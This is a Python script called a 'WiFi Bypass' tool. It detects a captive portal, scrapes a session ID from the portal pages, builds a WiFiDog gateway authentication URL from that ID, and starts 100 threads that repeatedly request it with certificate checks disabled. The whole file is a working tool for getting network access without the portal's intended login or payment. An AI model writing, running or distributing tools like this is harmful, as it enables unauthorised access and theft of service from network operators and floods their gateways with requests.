#!/usr/bin/env python

import requests
import re
import urllib3
import time
import threading
import os
import random
import hashlib
import ssl
import json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG & COLORS
# ===============================
ORANGE = "\033[38;5;208m"
BOLD = "\033[1m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
RESET = "\033[00m"

stop_event = threading.Event()
start_time = None

# ===============================
# UTILS & HEADER
# ===============================
def print_header(text):
    line = "═" * (len(text) + 4)
    print(f"\n{ORANGE}╔{line}╗")
    print(f"║  {BOLD}{text}{RESET}{ORANGE}  ║")
    print(f"╚{line}╝{RESET}")

# ===============================
# NETWORK FUNCTIONS
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(auth_link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while not stop_event.is_set():
        try:
            requests.get(auth_link, timeout=5, verify=False, headers=headers)
            time.sleep(0.05)
        except:
            time.sleep(1)
            break

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    global start_time
    os.system('clear')
    print_header("AHLFLK WiFi Bypass FREE")
    
    spinner = ['|', '/', '-', '\\']
    spin_idx = 0

    while not stop_event.is_set():
        session = requests.Session()
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            if r.status_code == 204 and check_real_internet():
                if start_time is None:
                    start_time = time.time()
                
                elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time))
                print(f"{GREEN}{BOLD}✅ Internet Connected! {ORANGE}{BOLD}[ {spinner[spin_idx]} ] {CYAN}{BOLD}Session: {elapsed} {RESET}", end="\r")
                
                spin_idx = (spin_idx + 1) % len(spinner)
                time.sleep(0.1)
                continue

            # Connection lost or portal detected
            start_time = None 
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            print(f"\n{CYAN}{BOLD}[*] Portal Detected: {portal_host}{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if not sid:
                print(f"{RED}{BOLD}[!] Waiting for Portal Login...{RESET}", end="\r")
                time.sleep(3)
                continue

            print(f"{GREEN}{BOLD}✅ SID Captured: {sid}{RESET}")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print_header("Turbo Threads Active")
            for i in range(100):
                threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()

            time.sleep(2)

        except KeyboardInterrupt:
            raise
        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n\n{RED}{BOLD}🛑 ShutDown...{RESET}")
